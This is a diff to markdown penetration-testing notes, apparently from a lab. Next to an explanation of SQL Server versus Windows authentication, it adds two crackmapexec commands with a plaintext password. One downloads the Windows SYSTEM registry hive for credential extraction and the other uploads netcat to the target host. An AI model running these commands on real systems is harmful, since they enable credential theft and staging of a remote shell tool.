@@ -26,3 +26,9 @@ Example connection string using SQL Server Authentication:
 >User Credentials: Relies on the user's Windows credentials (username and password) without requiring a separate SQL Server username and password.
 Authentication Process: The SQL Server trusts the Windows authentication process, and the user is authenticated based on their Windows login credentials.
 Security Implications: Generally considered more secure as it leverages the security features of the Windows operating system. Credentials are not typically stored in connection strings.
+
+### MSSQL Upload and Download Files
+```
+proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.133.148 -u sql_svc -p Dolphin1 --get-file C:\\windows.old\\Windows\\System32\\SYSTEM /home/kali/Desktop/SYSTEM
+proxychains4 -f /etc/proxychains4.conf crackmapexec mssql 10.10.133.148 -u sql_svc -p Dolphin1 --put-file nc.exe C:\\Users\\Public\\nc.exe
+```
